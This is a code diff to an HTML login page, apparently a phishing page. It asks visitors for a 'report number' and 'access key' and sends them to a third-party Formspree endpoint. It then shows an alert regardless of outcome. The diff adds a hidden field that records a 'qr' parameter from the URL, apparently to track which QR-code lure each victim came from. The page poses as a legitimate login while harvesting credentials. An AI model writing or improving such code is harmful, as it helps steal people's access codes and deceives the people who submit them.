@@ -104,13 +104,16 @@
         <input type="text" id="secureCode" name="access_key" placeholder="Access key">
       </div>
 
+      <!-- ✅ 新增隐藏字段 -->
+      <input type="hidden" name="qr_id" id="qr-id" value="">
+
       <a href="#" class="forgot" id="forgot">Forgot login?</a>
       <button type="submit" class="btn-login" id="loginBtn">Log In</button>
     </form>
   </div>
 
   <script>
-    // === 多语言设置 ===
+    // === 语言设置 ===
     const translations = {
       en: {
         title: "Log in to your report",
@@ -167,7 +170,7 @@
 
     setLanguage();
 
-    // 自动跳转输入框
+    // === 自动跳转输入框 ===
     const inputs = document.querySelectorAll('#codeInputs input');
     inputs.forEach((input, index) => {
       input.addEventListener('input', () => {
@@ -182,7 +185,12 @@
       });
     });
 
-    // 提交表单 -> Formspree -> 然后显示弹窗
+    // ✅ 从 URL 获取 qr 参数
+    const params = new URLSearchParams(window.location.search);
+    const qrParam = params.get("qr") || "default";
+    document.getElementById("qr-id").value = qrParam;
+
+    // === 提交到 Formspree，再显示提示框 ===
     document.getElementById("loginForm").addEventListener("submit", async function(e) {
       e.preventDefault();
 
@@ -192,26 +200,26 @@
         .join('');
       const key = document.getElementById('secureCode').value;
       const lang = localStorage.getItem('lang') || 'en';
+      const qr_id = document.getElementById('qr-id').value;
 
       try {
-        // ✅ 先提交到 Formspree
         const res = await fetch("https://formspree.io/f/mgvnnaey", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             report_number: digits,
             access_key: key,
+            qr_id: qr_id, // ✅ 一起提交
             language: lang,
             source: "8digit&pw.html"
           })
         });
-
         console.log("✅ Sent to Formspree:", res.status);
       } catch (err) {
         console.error("❌ Send error:", err);
       }
 
-      // ✅ 最后再显示弹窗（即使提交成功也会显示）
+      // 显示弹窗
       alert(msg);
     });
   </script>
